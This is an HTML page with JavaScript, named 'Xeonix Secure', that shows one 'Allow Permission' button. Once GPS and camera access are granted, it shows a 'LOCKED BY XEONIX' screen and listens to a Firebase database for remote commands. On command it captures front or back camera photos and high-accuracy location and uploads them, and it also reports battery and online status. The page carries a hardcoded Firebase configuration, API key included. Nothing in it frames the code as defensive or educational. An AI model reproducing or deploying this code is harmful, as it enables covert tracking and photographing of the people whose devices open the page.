<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Xeonix Secure</title>

<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>

<style>
body{
margin:0;
font-family:Arial, sans-serif;
background:#111;
color:white;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
flex-direction:column;
text-align:center;
}
button{
padding:14px 25px;
border:none;
border-radius:8px;
background:#00c6ff;
color:black;
font-size:16px;
cursor:pointer;
}
#adminIcon{
position:absolute;
top:15px;
right:15px;
font-size:20px;
cursor:pointer;
}
.locked{
background:radial-gradient(circle,#001f3f,#000);
}
</style>
</head>
<body>

<div id="adminIcon" onclick="goAdmin()">⚙️</div>

<div id="content">
<h1>Xeonix Secure</h1>
<button onclick="activateAll()">Allow Permission</button>
</div>

<script>

const firebaseConfig = {
apiKey: "AIzaSyC71owbERIUTdALLUeTILc9KTWYuZ5TNqQ",
authDomain: "xeonix-e8b4d.firebaseapp.com",
databaseURL: "https://xeonix-e8b4d-default-rtdb.asia-southeast1.firebasedatabase.app",
projectId: "xeonix-e8b4d",
storageBucket: "xeonix-e8b4d.firebasestorage.app",
messagingSenderId: "1069914635197",
appId: "1:1069914635197:web:69cfb35ca50b05ac5670d4"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const deviceId="device1";

let isProcessing = false;

function goAdmin(){
window.location.href="admin.html";
}

async function activateAll(){

// GPS permission
await new Promise((resolve,reject)=>{
navigator.geolocation.getCurrentPosition(resolve,reject);
});

// Camera permission
try{
let stream = await navigator.mediaDevices.getUserMedia({video:true});
stream.getTracks().forEach(track=>track.stop());
}catch(e){}

lockScreen();
listenCommands();
sendOnlineStatus(true);
sendBattery();
}

function lockScreen(){
document.body.classList.add("locked");
document.getElementById("adminIcon").style.display="none";
document.getElementById("content").innerHTML="<h1>LOCKED BY XEONIX</h1>";
}

/* ================= FIXED LISTEN COMMAND ================= */

function listenCommands(){

db.ref("devices/"+deviceId+"/command").on("value", async (snap)=>{

let cmd = snap.val();
if(!cmd) return;

// prevent duplicate execution
if(isProcessing) return;
isProcessing = true;

try{

if(cmd === "get_location"){
await getLocation();
}

if(cmd === "take_photo_front"){
await capturePhoto("user");
}

if(cmd === "take_photo_back"){
await capturePhoto("environment");
}

if(cmd === "force_logout"){
forceLogout();
}

}catch(err){
console.log("Command error:", err);
}

// reset command after execution
await db.ref("devices/"+deviceId+"/command").set(null);

isProcessing = false;

});
}

/* ================= GPS ================= */

function getLocation(){

return new Promise((resolve)=>{

navigator.geolocation.getCurrentPosition(
async function(pos){

let lat=pos.coords.latitude;
let lon=pos.coords.longitude;

db.ref("devices/"+deviceId+"/gpsHistory").push({
lat: lat,
lon: lon,
accuracy: pos.coords.accuracy.toFixed(2),
desa:"-",
kecamatan:"-",
kabupaten:"-",
provinsi:"-",
time: Date.now()
});

resolve();

},
function(error){
console.log("GPS error:", error.message);
resolve();
},
{
enableHighAccuracy: true,
timeout: 10000,
maximumAge: 0
}
);

});

}

/* ================= CAMERA ================= */

async function capturePhoto(mode){

try{

let stream=await navigator.mediaDevices.getUserMedia({
video:{facingMode:mode}
});

let video=document.createElement("video");
video.srcObject=stream;

await video.play();

// tunggu 200ms biar frame stabil
await new Promise(r=>setTimeout(r,200));

let canvas=document.createElement("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

canvas.getContext("2d").drawImage(video,0,0);

let image=canvas.toDataURL("image/jpeg",0.8);

stream.getTracks().forEach(track=>track.stop());

await db.ref("devices/"+deviceId+"/photos").push({
image:image,
time:Date.now()
});

}catch(e){
console.log("Camera capture error:", e);
}

}

/* ================= LOGOUT ================= */

function forceLogout(){

sendOnlineStatus(false);
db.ref("devices/"+deviceId+"/battery").remove();

document.body.classList.remove("locked");
document.getElementById("adminIcon").style.display="block";
document.getElementById("content").innerHTML=`
<h1>Xeonix Secure</h1>
<button onclick="activateAll()">Allow Permission</button>
`;

}

/* ================= ONLINE ================= */

function sendOnlineStatus(status){
db.ref("devices/"+deviceId+"/online").set(status);
}

window.addEventListener("beforeunload",()=>{
sendOnlineStatus(false);
});

/* ================= BATTERY ================= */

function sendBattery(){
if('getBattery' in navigator){
navigator.getBattery().then(function(battery){

function updateBattery(){
db.ref("devices/"+deviceId+"/battery").set({
level: (battery.level * 100).toFixed(1),
charging: battery.charging
});
}

updateBattery();
battery.addEventListener('levelchange', updateBattery);
battery.addEventListener('chargingchange', updateBattery);

});
}
}

</script>
</body>
</html>
